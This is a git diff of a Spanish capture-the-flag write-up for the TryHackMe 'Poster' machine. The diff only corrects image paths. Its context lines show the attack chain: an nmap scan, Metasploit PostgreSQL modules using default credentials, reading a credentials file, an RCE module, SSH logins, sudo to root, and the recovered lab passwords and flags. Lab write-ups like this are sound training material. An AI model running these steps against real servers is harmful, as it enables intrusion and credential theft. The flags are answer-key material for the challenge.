@@ -43,7 +43,7 @@ Escaneo completo de puertos:
 nmap -sC -sV -p- 10.128.165.36
 ```
 
-![nmap](imagenes/nmap.png)
+![nmap](Maquina_de_Linux/Poster/imagenes/nmap.png)
 
 Esto te dice:
 
@@ -58,13 +58,13 @@ Abrimos la consola
 
 msfconsole
 
-![nmap](imagenes/msf.png)
+![nmap](Maquina_de_Linux/Poster/imagenes/msf.png)
 
 Ya dentro de Metasploit Framework, seleccionamos el módulo:
 
 Buscamos con search el módulo que queremos
 
-![search](imagenes/search.png)
+![search](Maquina_de_Linux/Poster/imagenes/search.png)
 
 
 ```bash
@@ -101,7 +101,7 @@ set RHOSTS 10.128.162.111
 ```
 RHOSTS = máquina víctima
 
-![use](/Maquina_de_Linux/Poster/imagenes/login.png)
+![use](Maquina_de_Linux/Poster/imagenes/login.png)
 
 ### 3.2 Ejecución del ataque
 
@@ -142,7 +142,7 @@ Despues de colocar todo le damos a:
 run
 ```
 
-![use](/Maquina_de_Linux/Poster/imagenes/use.png)
+![use](Maquina_de_Linux/Poster/imagenes/use.png)
 
 Al ejecutar el módulo también se obtuvo la versión del servidor PostgreSQL (PostgreSQL X.Y.Z). Disponer de este dato es importante, ya que permite analizar si esa versión concreta presenta vulnerabilidades conocidas (CVE), configuraciones por defecto inseguras o características específicas que puedan facilitar fases posteriores del ataque, como la enumeración avanzada o la explotación del sistema.
 
@@ -169,7 +169,7 @@ set USERNAME postgres
 set PASSWORD password
 ```
 
-![use](/Maquina_de_Linux/Poster/imagenes/hash.png)
+![use](Maquina_de_Linux/Poster/imagenes/hash.png)
 
 Ejecución del módulo
 
@@ -199,7 +199,7 @@ set USERNAME postgres
 set PASSWORD password
 ```
 
-![use](/Maquina_de_Linux/Poster/imagenes/use2.png)
+![use](Maquina_de_Linux/Poster/imagenes/use2.png)
 
 Ejecución del módulo
 
@@ -221,7 +221,7 @@ Entre los resultados destacan los siguientes:
 ```bash
 /home/dark/credentials.txt
 ```
-![creden](/Maquina_de_Linux/Poster/imagenes/creden.png)
+![creden](Maquina_de_Linux/Poster/imagenes/creden.png)
 
 ### 3.7 Descubrimiento de credenciales
 
@@ -240,7 +240,7 @@ Resultado obtenido
 dark:qwerty1234#!hackme
 ```
 
-![rfile](/Maquina_de_Linux/Poster/imagenes/rfile.png)
+![rfile](Maquina_de_Linux/Poster/imagenes/rfile.png)
 
 
 ## 4. Ejecución remota de comandos mediante PostgreSQL (RCE)
@@ -280,7 +280,7 @@ set PASSWORD password
 set LHOST 192.168.142.53
 ```
 
-![use](/Maquina_de_Linux/Poster/imagenes/use3.png)
+![use](Maquina_de_Linux/Poster/imagenes/use3.png)
 
 Donde:
 
@@ -309,7 +309,7 @@ Cuando pida contraseña:
 ```bash
 qwerty1234#!hackme
 ```
-![ssh](imagenes/ssh.png)
+![ssh](Maquina_de_Linux/Poster/imagenes/ssh.png)
 
 Si funciona, veremos:
 
@@ -344,7 +344,7 @@ Salida esperada:
 alison  dark
 ```
 
-![alison](imagenes/alison.png)
+![alison](Maquina_de_Linux/Poster/imagenes/alison.png)
 
 Esto indica que existe otro usuario potencialmente interesante: alison
 
@@ -397,7 +397,7 @@ $dbuname = "alison";
 $dbpass = "p4ssw0rdS3cur3!#";
 ```
 
-![cd](imagenes/cat.png)
+![cd](Maquina_de_Linux/Poster/imagenes/cat.png)
 
 Se identifican credenciales en texto plano del usuario alison
 
@@ -432,7 +432,7 @@ Resultado:
 (ALL : ALL) ALL
 ```
 
-![ssh](imagenes/sudo.png)
+![ssh](Maquina_de_Linux/Poster/imagenes/sudo.png)
 
 El usuario alison puede ejecutar cualquier comando como root.
 
@@ -455,7 +455,7 @@ Salida:
 root
 ```
 
-![sudo](imagenes/root.png)
+![sudo](Maquina_de_Linux/Poster/imagenes/root.png)
 
 Acceso total al sistema
 
@@ -495,7 +495,7 @@ El resultado es:
 ```bash
 THM{postgresql_fa1l_conf1gurat1on}
 ```
-![user](imagenes/user.png)
+![user](Maquina_de_Linux/Poster/imagenes/user.png)
 
 
 ## 11.Root flag
@@ -525,5 +525,5 @@ El resultado es:
 THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
 ```
 
-![root](imagenes/root2.png)
+![root](Maquina_de_Linux/Poster/imagenes/root2.png)
 
